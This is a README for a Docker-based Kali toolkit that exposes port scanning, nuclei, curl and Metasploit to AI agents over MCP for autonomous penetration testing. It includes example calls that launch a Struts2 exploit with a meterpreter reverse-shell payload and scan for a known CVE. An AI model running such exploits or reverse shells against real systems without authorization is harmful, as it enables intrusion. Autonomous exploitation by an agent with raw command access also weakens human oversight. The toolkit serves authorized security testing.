# RedAmon MCP Servers

MCP (Model Context Protocol) servers for agentic penetration testing. These servers expose security tools to AI agents via the MCP protocol, enabling autonomous vulnerability discovery and exploitation.

## Architecture

### Folder Structure

```
mcp/
├── docker-compose.yml      # Container orchestration
├── requirements.txt        # Python dependencies
├── kali-sandbox/
│   └── Dockerfile         # Kali Linux with all tools
├── servers/
│   ├── __init__.py
│   ├── run_servers.py     # Server launcher
│   ├── naabu_server.py    # Port scanning (dynamic)
│   ├── nuclei_server.py   # Vuln scanning (dynamic)
│   ├── curl_server.py     # HTTP client (dynamic)
│   └── metasploit_server.py  # Exploitation (structured)
├── output/                # Scan results
└── nuclei-templates/      # Custom nuclei templates (optional)
```

### How It Works

```
HOST (your machine)                              DOCKER CONTAINER (Kali Linux)
───────────────────                              ─────────────────────────────

mcp/servers/                      ──VOLUME──>    /opt/mcp_servers/
├── naabu_server.py               (hot reload)   ├── naabu_server.py
├── nuclei_server.py                             ├── nuclei_server.py
├── curl_server.py                               ├── curl_server.py
├── metasploit_server.py                         ├── metasploit_server.py
└── run_servers.py                               └── run_servers.py
                                                          │
mcp/requirements.txt              ──COPY──>      /tmp/requirements.txt
                                  (build time)           │
                                                         ▼
                                                 pip install → /opt/venv/
                                                         │
                                                         ▼
                                                 python3 run_servers.py
                                                         │
                                         ┌───────────────┼───────────────┐
                                         │               │               │
                                         ▼               ▼               ▼
                                    Process 1       Process 2       Process 3 ...
                                         │               │               │
                                         ▼               ▼               ▼
                                    :8000           :8001           :8002       :8003
                                    naabu           curl            nuclei      metasploit
                                         │               │               │           │
                                         ▼               ▼               ▼           ▼
                                    /usr/bin/      /usr/bin/      /root/go/bin/ msfconsole
                                    naabu          curl           nuclei
```

### Environment Variables

These variables are set in `docker-compose.yml` and passed to the container:

| Variable | Value | Description |
|----------|-------|-------------|
| `MCP_TRANSPORT` | `sse` | Transport mode: `stdio` (direct) or `sse` (network) |
| `MCP_HOST` | `0.0.0.0` | Host to bind servers (`0.0.0.0` = all interfaces) |
| `NAABU_PORT` | `8000` | Port scanner server |
| `CURL_PORT` | `8001` | HTTP client server |
| `NUCLEI_PORT` | `8002` | Vulnerability scanner server |
| `METASPLOIT_PORT` | `8003` | Exploitation framework server |

### Data Flow

```
AI Agent (Claude/LangGraph)
         │
         │ MCP Protocol (JSON-RPC over SSE)
         ▼
┌─────────────────────────────────────────────────────────────┐
│                    KALI CONTAINER                            │
│                                                              │
│  ┌──────────────┐    ┌──────────────┐    ┌──────────────┐  │
│  │ naabu_server │    │ nuclei_server│    │  msf_server  │  │
│  │   :8000      │    │    :8002     │    │    :8003     │  │
│  └──────┬───────┘    └──────┬───────┘    └──────┬───────┘  │
│         │                   │                   │           │
│         ▼                   ▼                   ▼           │
│  subprocess.run()    subprocess.run()    subprocess.run()  │
│         │                   │                   │           │
│         ▼                   ▼                   ▼           │
│    /root/go/bin/      /root/go/bin/       msfconsole       │
│       naabu              nuclei                             │
│         │                   │                   │           │
└─────────┼───────────────────┼───────────────────┼───────────┘
          │                   │                   │
          ▼                   ▼                   ▼
    ┌─────────────────────────────────────────────────┐
    │              TARGET NETWORK                      │
    │               10.0.0.0/24                        │
    └─────────────────────────────────────────────────┘
```

### Tool Design Philosophy

| Server | Approach | Tools | Rationale |
|--------|----------|-------|-----------|
| naabu | Dynamic CLI | `execute_naabu(args)`, `naabu_help()` | Simple CLI, LLM knows flags |
| nuclei | Dynamic CLI | `execute_nuclei(args)`, `nuclei_help()` | Many templates/options |
| curl | Dynamic CLI | `execute_curl(args)`, `curl_help()` | Countless flags, LLM expertise |
| metasploit | Structured | 7 specific tools | Stateful, sessions, complex workflows |

**Dynamic CLI**: Pass raw command-line arguments. Maximum flexibility, trusts LLM knowledge.

**Structured Tools**: Explicit parameters for each function. Better for stateful operations.

## Quick Start

### 1. Build and Start Container

```bash
cd mcp
docker-compose up -d --build
```
#### only start after build
```bash
docker-compose up -d
```

### 2. Verify Services

```bash
# Check container status
docker-compose ps

# View logs
docker-compose logs -f kali-sandbox

# Test a server
curl http://localhost:8000/health

# Test commmands run for each server:
python mcp/test_mcp.py https://testphp.vulnweb.com
```

### 3. Connect AI Agent

The MCP servers are available at:
- **naabu**: `http://localhost:8000` (port scanning)
- **curl**: `http://localhost:8001` (HTTP requests)
- **nuclei**: `http://localhost:8002` (vulnerability scanning)
- **metasploit**: `http://localhost:8003` (exploitation)

## Available Tools

### Naabu Server (Port 8000)

| Tool | Description |
|------|-------------|
| `execute_naabu(args)` | Run naabu with any CLI arguments |
| `naabu_help()` | Get naabu usage information |

**Examples:**
```python
execute_naabu("-host 10.0.0.5 -p 1-1000 -json")
execute_naabu("-host 10.0.0.5 -top-ports 100 -nmap-cli 'nmap -sV'")
```

### Nuclei Server (Port 8002)

| Tool | Description |
|------|-------------|
| `execute_nuclei(args)` | Run nuclei with any CLI arguments |
| `nuclei_help()` | Get nuclei usage information |

**Examples:**
```python
execute_nuclei("-u http://10.0.0.5 -severity critical,high -jsonl")
execute_nuclei("-u http://10.0.0.5 -id CVE-2021-41773 -jsonl")
```

### Curl Server (Port 8001)

| Tool | Description |
|------|-------------|
| `execute_curl(args)` | Run curl with any CLI arguments |
| `curl_help()` | Get curl usage information |

**Examples:**
```python
execute_curl("-s -i http://10.0.0.5/")
execute_curl("-s -X POST -d 'user=admin' http://10.0.0.5/login")
```

### Metasploit Server (Port 8003)

| Tool | Description |
|------|-------------|
| `metasploit_search(query)` | Search for modules |
| `metasploit_info(module_name)` | Get module details |
| `metasploit_module_payloads(module_name)` | List compatible payloads |
| `metasploit_payload_info(payload_name)` | Get payload details |
| `metasploit_exploit(...)` | Execute an exploit |
| `metasploit_sessions()` | List active sessions |
| `metasploit_session_interact(session_id, command)` | Run commands on session |

**Examples:**
```python
metasploit_search("CVE-2017-5638")
metasploit_exploit(
    module="multi/http/struts2_content_type_ognl",
    rhosts="10.0.0.5",
    rport=8080,
    payload="linux/x64/meterpreter/reverse_tcp",
    lhost="10.0.0.10",
    lport=4444
)
```

## Running Locally (Development)

### stdio Mode (Single Server)

```bash
cd mcp/servers
python run_servers.py --server naabu --stdio
```

### SSE Mode (All Servers)

```bash
cd mcp/servers
pip install -r ../requirements.txt
python run_servers.py
```

## Configuration

All configuration is hardcoded in `docker-compose.yml`:

```yaml
environment:
  - MCP_TRANSPORT=sse
  - MCP_HOST=0.0.0.0
  - NAABU_PORT=8000
  - CURL_PORT=8001
  - NUCLEI_PORT=8002
  - METASPLOIT_PORT=8003
```

To change ports or settings, edit `docker-compose.yml` directly.

## Integration with Claude Code

Add to your Claude Code MCP configuration:

```json
{
  "mcpServers": {
    "naabu": {
      "url": "http://localhost:8000"
    },
    "nuclei": {
      "url": "http://localhost:8002"
    },
    "curl": {
      "url": "http://localhost:8001"
    },
    "metasploit": {
      "url": "http://localhost:8003"
    }
  }
}
```

## Security Notice

These tools are designed for **authorized penetration testing only**. Only use against systems you have explicit permission to test. The containers run with elevated privileges (`NET_ADMIN`, `NET_RAW`) required for network scanning.

## Troubleshooting

### Metasploit Slow to Start

First run initializes the database. Subsequent starts are faster.

```bash
# Check Metasploit status
docker-compose exec kali-sandbox msfdb status
```

### Nuclei Templates Missing

Templates are auto-downloaded on first run. Force update:

```bash
docker-compose exec kali-sandbox nuclei -update-templates
```

### Permission Denied for Scanning

Ensure container has required capabilities:

```bash
docker-compose exec kali-sandbox capsh --print
```
